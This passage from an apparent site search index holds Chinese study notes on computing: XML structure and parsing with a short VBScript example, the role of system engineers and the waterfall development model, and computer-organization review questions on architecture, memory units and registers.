\u500d\u8fd8\u591a\u3002\u6587\u4ef6\u5c3a\u5bf8\u589e\u5927\uff0c\u5c31\u610f\u5473\u7740\u4f1a\u5360\u7528\u66f4\u591a\u7684\u5b58 \u50a8\u7a7a\u95f4\u3001\u9700\u8981\u66f4\u957f\u7684\u4f20\u8f93\u53ca\u5904\u7406\u65f6\u95f4\u3002</p> <p>\u25cf 11.6 \u53ef\u4ee5\u4e3aXML\u6807\u7b7e\u8bbe\u5b9a\u547d\u540d\u7a7a\u95f4 230 </p> <p>\u25cf 11.7 \u53ef\u4ee5\u4e25\u683c\u5730\u5b9a\u4e49XML\u7684\u6587\u6863\u7ed3\u6784 232 </p> <p>\u6709\u6548\u7684 XML \u6587\u6863:\u6240\u8c13\u6709\u6548\u7684 XML \u6587\u6863\u662f \u6307\u5728 XML \u6587\u6863\u4e2d\u5199\u6709 DTD(Document Type Definition\uff0c\u6587\u6863\u7c7b\u578b\u63cf\u8ff0)\u4fe1\u606f\u3002</p> <p>\u5176\u5b9e\u5b8c\u6574\u7684 XML \u6587\u6863\u5305\u62ec XML \u58f0\u660e\u3001 XML \u5b9e\u4f8b\u548c DTD \u4e09\u4e2a\u90e8\u5206\u3002\u6240\u8c13 XML \u58f0\u660e\uff0c\u5c31\u662f\u5199\u5728 XML \u6587\u6863\u5f00 \u5934\u7684\u3001\u5f62\u5982 <code>&lt;?xml version=\"1.0\" encoding=\"Shift_JIS\"?&gt;</code>\u7684\u90e8\u5206\u3002XML \u5b9e\u4f8b\u662f\u6587\u6863\u4e2d\u901a\u8fc7\u6807\u7b7e\u88ab\u6807\u8bb0\u7684\u90e8\u5206\u3002\u800c DTD \u7684\u4f5c\u7528\u662f\u5b9a\u4e49 XML \u5b9e \u4f8b\u7684\u7ed3\u6784\u3002\u867d\u7136\u4e5f\u53ef\u4ee5\u7701\u7565 DTD\uff0c\u4f46\u662f\u901a\u8fc7 DTD \u53ef\u4ee5\u4e25\u683c\u5730\u68c0\u67e5 XML \u5b9e\u4f8b\u7684\u5185\u5bb9\u662f\u5426\u6709\u6548\u3002</p> <p>\u25cf 11.8 \u7528\u4e8e\u89e3\u6790XML\u7684\u7ec4\u4ef6 233 </p> <p>\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668\u89e3\u6790 XML\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\uff08vb\uff09\u7b49\u89e3\u6790 XML\u3002</p> <pre><code>Set obj = CreateObject(\"Microsoft.XMLDOM\")\n obj.async = False\n obj.Load \"MyPet.xml\"\n s = \"\"\n For i = 1 To obj.documentElement.childNodes.length\n     s = s &amp; obj.documentElement.childNodes.Item(i - 1).nodeName\n     s = s &amp; \"...\"\n     s = s &amp; obj.documentElement.childNodes.Item(i - 1).Text\n     s = s &amp; vbCrLf\nNext MsgBox s\n</code></pre> <p>\u25cf 11.9 XML\u53ef\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u9886\u57df 235</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#12-se-239","title":"\u7b2c12 \u7ae0 SE \u8d1f\u8d23\u76d1\u7ba1\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6784\u5efa 239","text":"<p>\u25cf 12.1 SE\u662f\u81ea\u59cb\u81f3\u7ec8\u53c2\u4e0e\u7cfb\u7edf\u5f00\u53d1\u8fc7\u7a0b\u7684\u5de5\u7a0b\u5e08 241 </p> <p>\u25cf 12.2 SE\u672a\u5fc5\u62c5\u4efb\u8fc7\u7a0b\u5e8f\u5458 243 </p> <p>\u25cf 12.3 \u7cfb\u7edf\u5f00\u53d1\u8fc7\u7a0b\u7684\u89c4\u8303 243 </p> <p>\u25cf 12.4 \u5404\u4e2a\u9636\u6bb5\u7684\u5de5\u4f5c\u5185\u5bb9\u53ca\u6587\u6863 245 </p> <p>\u25cf 12.5 \u6240\u8c13\u8bbe\u8ba1\uff0c\u5c31\u662f\u62c6\u89e3 247 </p> <p>\u25cf 12.6 \u9762\u5411\u5bf9\u8c61\u6cd5\u7b80\u5316\u4e86\u7cfb\u7edf\u7ef4\u62a4\u5de5\u4f5c 249 </p> <p>\u25cf 12.7 \u6280\u672f\u80fd\u529b\u548c\u6c9f\u901a\u80fd\u529b 250 </p> <p>\u25cf 12.8 IT\u4e0d\u7b49\u4e8e\u5f15\u8fdb\u8ba1\u7b97\u673a 252 </p> <p>\u25cf 12.9 \u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6210\u529f\u4e0e\u5931\u8d25 253 </p> <p>\u25cf 12.10 \u5927\u5e45\u63d0\u5347\u8bbe\u5907\u5229\u7528\u7387\u7684\u591a\u673a\u5907\u4efd 255</p> <p>SE \u662f System Engineer\uff08\u7cfb\u7edf\u5de5\u7a0b\u5e08\uff09\u7684\u7f29\u7565\u8bed\u3002SE \u662f\u53c2\u4e0e\u6240\u6709\u5f00\u53d1\u9636\u6bb5\u7684\u5de5\u7a0b\u5e08\u3002\u7c7b\u4f3c\u4e8e\u56fd\u5185\u7684\u9879\u76ee\u7ecf\u7406\u3002</p> <p>\u8f6f \u4ef6 \u5f00 \u53d1 \u8fc7 \u7a0b \u7684 \u6a21 \u578b \u6709\u201c\u7011\u5e03\u6a21\u578b \u201d\u201c\u539f\u578b\u6a21\u578b\u201d\u201c\u87ba\u65cb\u6a21\u578b\u201d\u7b49\u3002\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u7011\u5e03\u6d41\u5f00\u53d1\u6a21\u578b</p> <p>SE \u6307\u7684\u662f\u5728\u8fdb\u884c\u4e1a\u52a1\u7684\u4fe1\u606f\u5316\u65f6\uff0c\u8d1f\u8d23\u8c03\u67e5\u3001\u5206\u6790\u4e1a\u52a1\u5185\u5bb9\uff0c\u786e\u5b9a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u57fa\u7840\u8bbe\u8ba1\u53ca\u5176\u8be6\u7ec6\u89c4\u683c\u7684\u6280\u672f\u4eba\u5458\u3002\u540c\u65f6 SE \u4e5f\u8d1f\u8d23\u7cfb\u7edf\u5f00\u53d1\u7684\u9879\u76ee\u7ba1\u7406\u548c\u8f6f\u4ef6\u7684\u5f00\u53d1\u7ba1\u7406\u3001\u7ef4\u62a4\u7ba1\u7406\u5de5\u4f5c\u3002\u7531\u4e8e\u4e3b\u8981\u7684\u5de5\u4f5c\u662f\u57fa\u7840\u8bbe\u8ba1\uff0c\u6240\u4ee5\u4e0d\u540c\u4e8e\u7f16\u5199\u7a0b\u5e8f\u7684\u7a0b\u5e8f\u5458\uff0cSE \u9700\u8981\u5177\u5907\u4ece\u786c\u4ef6\u7ed3\u6784\u3001\u8f6f\u4ef6\u7684\u6784\u5efa\u65b9\u6cd5\u4e43\u81f3\u6a2a\u8de8\u6574\u4e2a\u4e1a\u52a1\u7684\u5e7f\u6cdb\u77e5\u8bc6\u4ee5\u53ca\u9879\u76ee\u7ba1\u7406\u7684\u7ecf\u9a8c\u3002</p> <p>SE \u8d1f\u8d23\u7684\u5de5\u4f5c\u662f\u9879\u76ee\u7ba1\u7406\u548c\u8f6f\u4ef6\u5f00\u53d1\u7ba1\u7406\uff0c\u4ee5\u53ca\u5f15\u8fdb\u8ba1\u7b97\u673a\u7cfb\u7edf\u540e\u7684\u7ef4\u62a4\uff0c\u800c\u5236\u4f5c\u8f6f\u4ef6\uff08\u7f16\u7a0b\uff09\u7684\u5de5\u4f5c\u5219\u4ea4\u7531\u7a0b\u5e8f\u5458\u5b8c\u6210\u3002</p> <p>\u7011\u5e03\u6a21\u578b\u7684\u4e0d\u540c\u9636\u6bb5\uff0c\u90fd\u5e94\u66f4\u6539\u6709\u6587\u6863\u5e76\u8fdb\u884c\u5ba1\u6838\u3002\u5ba1\u6838\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u8fdb\u5165\u4e0b\u4e00\u4e2a\u9636\u6bb5\u3002\u8fd9\u79cd\u5f00\u53d1\u6a21\u5f0f\u9002\u5408\u4e8e\u56e2\u961f\u4eba\u6570\u8f83\u591a\uff0c\u8f6f\u4ef6\u8bbe\u8ba1\u6bd4\u8f83\u590d\u6742\u7684\u60c5\u51b5\u3002</p> <p>\u7011\u5e03\u6d41\u7684\u597d\u5904\uff0c1\u3001\u786e\u5b9a\u9700\u6c42\u524d\u5c31\u8fdb\u884c\u7cbe\u786e\u7684\u8bba\u8bc1\uff0c\u8fd9\u4e2a\u5c31\u907f\u514d\u4e86\u540e\u7eed\u9700\u6c42\u53d8\u5316\u9020\u6210\u7684\u8fd4\u5de5\u7b49\u95ee\u9898\u30022\u3001\u521a\u5f00\u59cb\u4ece\u9876\u5c42\u8bbe\u8ba1\uff0c\u8bbe\u8ba1\u4ee3\u7801\u5c42\u9762\u8003\u8651\u5230\u6574\u4f53\u7684\u529f\u80fd\u548c\u590d\u6742\u5ea6\uff0c\u907f\u514d\u4e86\u540e\u7eed\u529f\u80fd\u6269\u5bb9\u517c\u5bb9\u9020\u6210\u7684\u79cd\u79cd\u95ee\u9898\u3002</p> <p>\u5728\u7011\u5e03\u6d41\u5f00\u53d1\u6a21\u578b\u4e2d\uff0cSE \u5c31\u9700\u8981\u7cbe\u786e\u628a\u63a7\u65b9\u5411\u3002</p> <pre><code>\u5f00\u59cb\n\u9700\u6c42\u5206\u6790\u2014\u2014\u7cfb\u7edf\u7b56\u5212\u6587\u6863\u3001\u7cfb\u7edf\u529f\u80fd\u9700\u6c42\u89c4\u683c\u6587\u6863\n\u5916\u90e8\u8bbe\u8ba1\u2014\u2014\u5916\u90e8\u8bbe\u8ba1\u6587\u6863\n\u5185\u90e8\u8bbe\u8ba1\u2014\u2014\u5185\u90e8\u8bbe\u8ba1\u6587\u6863\n\u7a0b\u5e8f\u8bbe\u8ba1\u2014\u2014\u7a0b\u5e8f\u8bbe\u8ba1\u6587\u6863\n\u7f16\u7801\u5b9e\u73b0\u2014\u2014\u6a21\u5757\u8bbe\u8ba1\u6587\u6863\u3001\u6d4b\u8bd5\u8ba1\u5212\u6587\u6863\n\u6d4b\u8bd5\u2014\u2014\u6d4b\u8bd5\u62a5\u544a\n\u90e8\u7f72\u3001\u7ef4\u62a4\u2014\u2014\u90e8\u7f72\u624b\u518c\u3001\u7ef4\u62a4\u624b\u518c\n\u76ee\u6807\n</code></pre> <p>\u53ef\u4ee5\u5bf9\u7167\u4e00\u4e0b\u9879\u76ee\uff0c\u67e5\u770b\u76ee\u524d\u7684\u9879\u76ee\u7f3a\u5c11\u54ea\u4e9b\u6587\u6863\uff0c\u5e76\u8fdb\u884c\u5b8c\u5584\u3002</p> <p>\u5728\u8ba1\u7b97\u673a\u884c\u4e1a\u4e2d\u5e38\u4f1a\u63d0\u53ca\u201c\u5916\u90e8\u201d\u548c\u201c\u5185\u90e8\u201d\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u628a\u4ece\u7528\u6237\u7684\u89d2\u5ea6\u770b\u5230\u7684\u4e1c\u897f\u79f0\u4e3a\u201c\u5916\u90e8\u201d\uff0c\u628a\u4ece\u5f00\u53d1\u8005\u7684\u89d2\u5ea6\u770b\u5230\u7684\u4e1c\u897f\u79f0\u4e3a\u201c\u5185\u90e8\u201d\u3002</p> <p>\u5927\u578b\u9879\u76ee\u6d4b\u8bd5\u6ce8\u610f\uff1a</p> <p>\u5230\u4e86\u201c\u6d4b\u8bd5\u201d\u9636\u6bb5\uff0c\u6d4b\u8bd5\u4eba\u5458\u8981\u6839\u636e\u6d4b\u8bd5\u8ba1\u5212\u6587\u6863\u7684\u5185\u5bb9\u786e\u8ba4\u7a0b\u5e8f\u7684\u529f\u80fd\u3002\u5728\u6700\u540e\u7f16\u5199\u7684\u201c\u6d4b\u8bd5\u62a5\u544a\u201d\u4e2d\uff0c\u8fd8\u5fc5\u987b\u5b9a\u91cf\u5730\uff08\u7528\u6570\u5b57\uff09\u6807\u793a\u51fa\u6d4b\u8bd5\u7ed3\u679c\u3002\u5982\u679c\u53ea\u8bb0\u5f55\u4e86\u4e00\u4e9b\u542b\u7cca\u7684\u6d4b\u8bd5\u7ed3\u679c\uff0c\u6bd4\u5982\u201c\u5df2\u6d4b\u8bd5\u201d\u6216\u662f\u201c\u6ca1\u95ee\u9898\u201d\uff0c\u90a3\u4e48\u5c31\u96be\u4ee5\u5224\u65ad\u7cfb\u7edf\u662f\u5426\u5408\u683c\u4e86\u3002</p> <p>\u5728\u5b9a\u91cf\u5730\u6807\u793a\u6d4b\u8bd5\u7ed3\u679c\u7684\u65b9\u6cd5\u4e2d\uff0c\u6709\u201c\u6d82\u8272\u68c0\u67e5\u201d\u548c\u201c\u8986\u76d6\u6d4b\u8bd5\u201d\u7b49\u65b9\u6cd5\u3002\u201c\u6d82\u8272\u68c0\u67e5\u201d\u7684\u505a\u6cd5\u662f\u4e00\u4e2a\u4e2a\u5730\u786e\u8ba4\u201c\u7cfb\u7edf\u529f\u80fd\u9700\u6c42\u89c4\u683c\u6587\u6863\u201d\u4e2d\u7684\u529f\u80fd\uff0c\u5982\u679c\u8be5\u529f\u80fd\u5b9e\u73b0\u4e86\uff0c\u5c31\u7528\u7ea2\u7b14\u628a\u5b83\u6d82\u7ea2\u3002\u201c\u8986\u76d6\u6d4b\u8bd5\u201d\u5219\u662f</p> <p>\u4e00\u79cd\u8868\u793a\u6709\u591a\u5c11\u4ee3\u7801\u7684\u884c\u4e3a\u5df2\u7ecf\u7ecf\u8fc7\u786e\u8ba4\u7684\u65b9\u6cd5\u3002\u201c\u901a\u8fc7\u6d82\u8272\u68c0\u67e5\uff0c\u5df2\u786e\u8ba4\u4e86\u7cfb\u7edf 95% \u7684\u529f\u80fd\u3002\u5269\u4e0b\u7684 5% \u867d\u7136\u6709\u95ee\u9898\uff0c\u4f46\u5df2\u7ecf\u67e5\u660e\u4e86\u539f\u56e0\uff0c\u53ef\u4ee5\u5728 1 \u5468\u5185\u4fee\u6b63\u201d\u201c\u5df2\u5b8c\u6210\u4e86 99% \u7684\u8986\u76d6\u6d4b\u8bd5\u3002\u7531\u4e8e\u5269\u4f59\u7684 1% \u662f\u4e0d\u53ef\u8fbe\u4ee3\u7801\uff08Dead Code\uff0c\u7edd\u4e0d\u4f1a\u88ab\u6267\u884c\u7684\u4ee3\u7801\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u5220\u9664\u201d\u3002\u5982\u679c\u80fd\u50cf\u8fd9\u6837\u7ed9\u51fa\u5b9a\u91cf\u7684\u6d4b\u8bd5\u7ed3\u679c\uff0c\u90a3\u4e48\u5c31\u5f88\u5bb9\u6613\u5224\u5b9a\u7cfb\u7edf\u662f\u5426\u5408\u683c\u4e86\u5427\u3002</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u8bbe\u8ba1\uff0c\u5c31\u662f\u62c6\u89e3\u3002\u628a\u5927\u578b\u7684\u6a21\u5757\u548c\u529f\u80fd\uff0c\u62c6\u89e3\u6210\u5c0f\u578b\u7684\u6a21\u5757\u548c\u529f\u80fd\u3002\u628a\u5927\u578b\u7684\u4ee3\u7801\u7ed3\u6784\uff0c\u9762\u5411\u5bf9\u8c61\u62c6\u89e3\u6210\u5c0f\u578b\u7684\u6a21\u5757\u6216\u8005\u4ee3\u7801\u6bb5\u3002</p> <p>\u6210\u529f\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u662f\u4ec0\u4e48\u6837\u7684\u5462\uff1f\u90a3\u5c31\u662f\u80fd\u5b8c\u5168\u6ee1\u8db3\u5ba2\u6237\u9700\u6c42\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u3002\u5ba2\u6237\u671f\u5f85\u7684\u662f\u7531\u8ba1\u7b97\u673a\u5e26\u6765\u7684 IT \u89e3\u51b3\u65b9\u6848\uff0c\u800c\u5e76\u975e\u8ba1\u7b97\u673a\u6280\u672f\u3002\u80fd\u6ee1\u8db3\u9700\u6c42\u4e14\u7a33\u5b9a\u5730\u5de5\u4f5c\uff0c\u8fd9\u6837\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6b63\u662f\u88ab\u5ba2\u6237\u6240\u9700\u8981\u7684\u3002</p> <p>\u5904\u4e8e\u6b63\u5e38\u8fd0\u8f6c\u72b6\u6001\u7684\u6bd4\u7387\u53eb\u4f5c\u201c\u8bbe\u5907\u5229\u7528\u7387\u201d\u3002\u5c06\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6784\u6210\u8981\u7d20\u8bbe\u6210\u591a\u673a\u5907\u4efd\uff0c\u53ef\u4ee5\u51fa\u4e4e\u610f\u6599\u5730\u5927\u5e45\u5ea6\u63d0\u5347\u8bbe\u5907\u5229\u7528\u7387\u3002</p> <p>\u5728\u4e2a\u4eba\u9879\u76ee\u4e2d\u7684\u5e94\u7528\uff0c\u6700\u540e\u9879\u76ee\u90e8\u7f72\u9636\u6bb5\u51e0\u4e2a\u65b9\u6848\uff1a</p> <p>1\u3001\u641e\u4e00\u4e2a\u5165\u95e8\u4e91\u670d\u52a1\u5668\uff0c\u7136\u540e\u90e8\u7f72\u8fd9\u4e9b\u670d\u52a1\u3002</p> <p>2\u3001\u6216\u8005\u81ea\u5df1\u505a\u4e00\u4e2a docker \u5305\uff0c\u7136\u540e\u5728\u53e6\u4e00\u4e2adocker\u4e2d\u90e8\u7f72-\u9700\u8981\u5b66\u4e60 docker commit \u7b49</p> <p>3\u3001\u76f4\u63a5\u5728\u53e6\u4e00\u4e2a\u8bbe\u5907\u4e2d\uff0c\u62c9\u4e0b\u5f00\u6e90\u7684\u4ee3\u7801\uff0c\u7136\u540e\u90e8\u7f72\u4e0a\u8ff0\u7684\u670d\u52a1\uff08\u53ef\u4ee5\u662f\u865a\u62df\u673a\uff0c\u6216\u8005\u662f\u53e6\u4e00\u4e2a mac \u7ec8\u7aef\u7b49\u7b49\uff09\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\u77e5\u8bc6\u70b9\u603b\u7ed3","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 25227  \u9605\u8bfb51\u5206\u949f</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_2","title":"\u7b2c\u4e00\u7ae0\uff1a\u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8bba","text":"<p>1\u3001\u8ba1\u7b97\u673a\u7cfb\u7edf\u7531\u54ea\u4e24\u90e8\u5206\u7ec4\u6210\uff1f\u8ba1\u7b97\u673a\u7cfb\u7edf\u6027\u80fd\u53d6\u51b3\u4e8e\u4ec0\u4e48\uff1f</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u662f\u7531\u201c\u786c\u4ef6\u201d\u548c\u201c\u8f6f\u4ef6\u201d\u7ec4\u6210\u3002\u8861\u91cf\u4e00\u53f0\u8ba1\u7b97\u673a\u6027\u80fd\u7684\u4f18\u52a3\u662f\u6839\u636e\u591a\u9879\u6280\u672f\u6307\u6807\u7efc\u5408\u786e\u5b9a\u7684\uff0c\u65e2\u5305\u62ec\u786c\u4ef6\u7684\u5404\u79cd\u6027\u80fd\u6307\u6807\uff0c\u53c8\u5305\u62ec\u8f6f\u4ef6\u7684\u5404\u79cd\u529f\u80fd\u3002 1\uff09\u8ba1\u7b97\u673a\u7cfb\u7edf\u7531\u786c\u4ef6\u548c\u8f6f\u4ef6\u4e24\u90e8\u5206\u7ec4\u6210\u3002 2\uff09\u8ba1\u7b97\u673a\u7cfb\u7edf\u6027\u80fd\u7531\u786c\u4ef6\u548c\u8f6f\u4ef6\u5171\u540c\u51b3\u5b9a\u3002</p> <p>2\u3001\u8ba1\u7b97\u673a\u7cfb\u7edf5\u5c42\u5c42\u6b21\u7ed3\u6784\u4ece\u4e0b\u5230\u4e0a\u7531\u54ea\u4e94\u5c42\u7ec4\u6210\uff1f\u54ea\u4e9b\u662f\u7269\u7406\u673a\uff0c\u54ea\u4e9b\u662f\u865a\u62df\u673a\uff1f</p> <p>1\uff09\u5fae\u7a0b\u5e8f\u673a\u5668\u3001\u4f20\u7edf\u673a\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u673a\u5668\u3001\u6c47\u7f16\u8bed\u8a00\u673a\u5668\u3001\u9ad8\u7ea7\u8bed\u8a00\u673a\u5668 2\uff09\u5fae\u7a0b\u5e8f\u673a\u5668\u548c\u4f20\u7edf\u673a\u5668\u662f\u7269\u7406\u673a\uff0c\u5176\u4ed6\u662f\u865a\u62df\u673a\u3002</p> <p>3\u3001\u5728\u8ba1\u7b97\u673a\u7cfb\u7edf\u7ed3\u6784\u4e2d\uff0c\u4ec0\u4e48\u662f\u7ffb\u8bd1\uff1f\u4ec0\u4e48\u662f\u89e3\u91ca\uff1f</p> <p>1\uff09\u7ffb\u8bd1\uff1a\u5c06\u4e00\u79cd\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u5168\u90e8\u7ffb\u8bd1\u6210\u53e6\u4e00\u79cd\u8bed\u8a00\uff0c\u7136\u540e\u518d\u6267\u884c\uff1b\uff08\u5168\u90e8\u7ffb\u8bd1\uff0c\u5168\u90e8\u6267\u884c\uff09 2\uff09\u89e3\u91ca\uff1a\u5c06\u4e00\u79cd\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u7684\u4e00\u6761\u8bed\u53e5\u7ffb\u8bd1\u6210\u53e6\u4e00\u79cd\u8bed\u8a00\u7684\u4e00\u6761\u6216\u591a\u6761\u8bed\u53e5\uff0c\u7136\u540e\u6267\u884c\uff0c\u6267\u884c\u5b8c\u8fd9\u6761\u8bed\u8a00\u540e\uff0c\u518d\u89e3\u91ca\u4e0b\u4e00\u6761\u3002\uff08\u4e00\u8fb9\u7ffb\u8bd1\uff0c\u4e00\u904d\u6267\u884c\uff09</p> <p>4\u3001\u4ec0\u4e48\u662f\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\uff1f\u4ec0\u4e48\u662f\u8ba1\u7b97\u673a\u7ec4\u6210\uff1f\u4ee5\u4e58\u6cd5\u6307\u4ee4\u4e3a\u4f8b\u8bf4\u660e\u4e8c\u8005\u533a\u522b\u3002</p> <p>1\uff09\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u662f\u6307\u90a3\u4e9b\u80fd\u591f\u88ab\u7a0b\u5e8f\u5458\u770b\u5230\u7684\u8ba1\u7b97\u673a\u7684\u5c5e\u6027\u3002\u5982\u6307\u4ee4\u96c6\u3001\u6570\u636e\u7c7b\u578b\u7b49\uff1b 2\uff09\u8ba1\u7b97\u673a\u7ec4\u6210\u662f\u6307\u5982\u4f55\u5b9e\u73b0\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u6240\u4f53\u73b0\u51fa\u6765\u7684\u5c5e\u6027\uff1b 3\uff09\u4ee5\u4e58\u6cd5\u6307\u4ee4\u4e3a\u4f8b\uff0c\u8ba1\u7b97\u673a\u662f\u5426\u6709\u4e58\u6cd5\u6307\u4ee4\uff0c\u5c5e\u4e8e\u4f53\u7cfb\u7ed3\u6784\u7684\u95ee\u9898\u3002\u4e58\u6cd5\u6307\u4ee4\u662f\u91c7\u7528\u4e13\u7528\u7684\u4e58\u6cd5\u5668\uff0c\u8fd8\u662f\u4f7f\u7528\u52a0\u6cd5\u5668\u548c\u79fb\u4f4d\u5668\u6784\u6210\uff0c\u5c5e\u4e8e\u8ba1\u7b97\u673a\u7ec4\u6210\u7684\u95ee\u9898\u3002</p> <p>5\u3001\u51af\u8bfa\u4f9d\u66fc\u673a\u5668\u7684\u4e3b\u8981\u7279\u70b9\uff1f</p> <p>1\uff09\u8ba1\u7b97\u673a\u7531\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u63a7\u5236\u5668\u3001\u8f93\u5165\u8bbe\u5907\u548c\u8f93\u51fa\u8bbe\u5907\u4e94\u5927\u90e8\u5206\u7ec4\u6210\uff1b 2\uff09\u6307\u4ee4\u548c\u6570\u636e\u5b58\u50a8\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5e76\u53ef\u4ee5\u6309\u5730\u5740\u8bbf\u95ee\uff1b 3\uff09\u6307\u4ee4\u548c\u6570\u636e\u5747\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff1b 4\uff09\u6307\u4ee4\u7531\u64cd\u4f5c\u7801\u548c\u5730\u5740\u7801\u6784\u6210\uff0c\u64cd\u4f5c\u7801\u6307\u660e\u64cd\u4f5c\u7684\u6027\u8d28\uff0c\u5730\u5740\u7801\u8868\u793a\u64cd\u4f5c\u6570\u5728\u5b58\u50a8\u5668\u4e2d\u7684\u4f4d\u7f6e\uff1b 5\uff09\u6307\u4ee4\u5728\u5b58\u50a8\u5668\u5185\u6309\u987a\u5e8f\u5b58\u653e\uff0c\u901a\u5e38\u6309\u81ea\u52a8\u7684\u987a\u5e8f\u53d6\u51fa\u6267\u884c\uff1b 6\uff09\u673a\u5668\u4ee5\u8fd0\u7b97\u5668\u4e3a\u4e2d\u5fc3\uff0cI/O\u8bbe\u5907\u4e0e\u5b58\u50a8\u5668\u4ea4\u6362\u6570\u636e\u4e5f\u8981\u901a\u8fc7\u8fd0\u7b97\u5668\u3002\uff08\u56e0\u6b64\uff0c\u540e\u6765\u6709\u4e86\u4ee5\u5b58\u50a8\u5668\u4e3a\u4e2d\u5fc3\u7684\u8ba1\u7b97\u673a\u7ed3\u6784\uff09</p> <p>6\u3001\u753b\u51fa\u73b0\u4ee3\u8ba1\u7b97\u673a\u7684\u7ec4\u6210\u6846\u56fe\u3002</p> <p>P10,\u56fe1.9</p> <p>7\u3001\u4ec0\u4e48\u662f\u5b58\u50a8\u5355\u5143\u3001\u5b58\u50a8\u5b57\u3001\u5b58\u50a8\u5b57\u957f\u3001\u5b58\u50a8\u4f53\uff1f</p> <p>\u5b58\u50a8\u5355\u5143\uff1a\u5b58\u50a8\u4e00\u4e2a\u5b58\u50a8\u5b57\u5e76\u5177\u6709\u7279\u5b9a\u5b58\u50a8\u5730\u5740\u7684\u5b58\u50a8\u5355\u4f4d\uff1b \u5b58\u50a8\u5b57\uff1a\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u4e2d\u5b58\u653e\u7684\u6240\u6709\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6309\u7167\u67d0\u4e2a\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5b58\u50a8\u5355\u5143\u83b7\u53d6\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u3002 \u5b58\u50a8\u5b57\u957f\uff1a\u5b58\u50a8\u5b57\u4e2d\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u4f4d\u6570\uff0c\u5373\u6309\u7167\u67d0\u4e2a\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5b58\u50a8\u5355\u5143\u83b7\u53d6\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u4f4d\u6570\uff1b \u5b58\u50a8\u4f53\uff1a\u7531\u591a\u4e2a\u5b58\u50a8\u5355\u5143\u6784\u6210\u7684\u5b58\u50a8\u5668\u4ef6\u3002</p> <p>8\u3001\u4e3b\u5b58\u50a8\u5668\u4e2d\uff0c\u4ec0\u4e48\u662fMAR\uff0c\u4ec0\u4e48\u662fMDR\uff0c\u5b58\u50a8\u5668\u7684\u6700\u5927\u5bb9\u91cf\u7531\u4ec0\u4e48\u51b3\u5b9a\uff1f</p> <p>1\uff09MAR\uff1a\u5b58\u50a8\u5730\u5740\u5bc4\u5b58\u5668\uff0c\u4fdd\u5b58\u9700\u8981\u8bbf\u95ee\u7684\u5b58\u50a8\u5355\u5143\u5730\u5740\u3002\u53cd\u6620\u5b58\u50a8\u5355\u5143\u7684\u4e2a\u6570\u3002 2\uff09MDR\uff1a\u5b58\u50a8\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u7f13\u5b58\u8bfb\u51fa/\u5199\u5165\u5b58\u50a8\u5355\u5143\u7684\u6570\u636e\u3002\u53cd\u6620\u5b58\u50a8\u5b57\u957f\u3002 3\uff09\u5b58\u50a8\u5668\u7684\u6700\u5927\u5bb9\u91cf\u7531MAR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u548cMDR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u51b3\u5b9a\u3002</p> <p>9\u3001\u4ec0\u4e48\u662f\u673a\u5668\u5b57\u957f\uff0c\u4ec0\u4e48\u662f\u5b58\u50a8\u5b57\u957f\u957f\uff1f</p> <p>\u673a\u5668\u5b57\u957f\uff1aCPU\u4e00\u6b21\u80fd\u591f\u5904\u7406\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u4f4d\u6570\u3002 \u5b58\u50a8\u5b57\u957f\uff1a\u6309\u7167\u67d0\u4e2a\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5b58\u50a8\u5355\u5143\u83b7\u53d6\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u4f4d\u6570\u3002</p> 